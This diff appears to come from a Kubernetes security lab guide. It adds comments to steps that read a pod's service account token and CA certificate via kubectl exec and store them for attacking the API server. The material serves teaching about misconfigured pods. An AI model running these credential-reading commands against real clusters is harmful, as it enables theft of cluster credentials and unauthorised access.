@@ -13,6 +13,7 @@ gcloud compute ssh root@kubernetes-security --zone europe-west3-a
 ### Getting the credentials
 
 ```bash
+# verify the sensitive data in the pod
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
@@ -20,7 +21,10 @@ kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/service
 ### Exploiting the API-Server
 
 ```bash
+# store the token into an env variable
 TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# store the CA into a file
 kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
 
 # get infos about pods
